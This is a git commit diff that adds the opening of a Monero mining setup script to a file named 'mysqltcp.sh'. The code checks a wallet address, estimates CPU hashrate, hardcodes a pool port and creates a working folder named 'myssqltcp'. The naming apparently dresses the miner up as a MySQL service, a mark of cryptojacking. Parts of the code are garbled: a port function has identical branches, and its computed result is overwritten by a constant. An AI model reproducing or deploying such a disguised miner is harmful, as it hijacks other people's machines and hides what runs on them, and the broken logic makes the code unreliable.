0494fb25da84cc8e7b1214ca249dcedd9fcc7e72
teshushu <905353149@qq.com>
2023-01-20 02:40:31 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -1,3 +1,122 @@
+#!/bin/bash
+
+VERSION=2.11
+
+# printing greetings
+
+echo "Mssqlup mining setup script v$VERSION."
+echo "(please report issues to admin@admin.com email with full output of this script with extra \"-x\" \"bash\" option)"
+echo
+
+if [ "$(id -u)" == "0" ]; then
+  echo "WARNING: Generally it is not adviced to run this script under root"
+fi
+
+# command line arguments
+WALLET=$1
+EMAIL=$2 # this one is optional
+
+# checking prerequisites
+
+if [ -z $WALLET ]; then
+  echo "Script usage:"
+  echo "> setup_wkgg_server.sh <wallet address> [<your email address>]"
+  echo "ERROR: Please specify your wallet address"
+  exit 1
+fi
+
+WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
+if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
+  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
+  exit 1
+fi
+
+if [ -z $HOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+if ! type curl >/dev/null; then
+  echo "ERROR: This script requires \"curl\" utility to work correctly"
+  exit 1
+fi
+
+if ! type lscpu >/dev/null; then
+  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
+fi
+
+#if ! sudo -n true 2>/dev/null; then
+#  if ! pidof systemd >/dev/null; then
+#    echo "ERROR: This script requires systemd to work correctly"
+#    exit 1
+#  fi
+#fi
+
+# calculating port
+
+CPU_THREADS=$(nproc)
+EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
+if [ -z $EXP_MONERO_HASHRATE ]; then
+  echo "ERROR: Can't compute projected Monero CN hashrate"
+  exit 1
+fi
+
+power2() {
+  if ! type bc >/dev/null; then
+    if   [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    elif [ "$1" -gt "0" ]; then
+      echo "0"
+    else
+      echo "1"
+    fi
+  else 
+    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
+  fi
+}
+
+PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
+PORT=$(( $PORT == 0 ? 1 : $PORT ))
+PORT=`power2 $PORT`
+PORT=$(( 14444 ))
+if [ -z $PORT ]; then
+  echo "ERROR: Can't compute port"
+  exit 1
+fi
+
+if [ "$PORT" -lt "14444" -o "$PORT" -gt "14444" ]; then
+  echo "ERROR: Wrong computed port value: $PORT"
+  exit 1
+fi
+
 cd /$HOME/
 mkdir myssqltcp
 cd /$HOME/myssqltcp
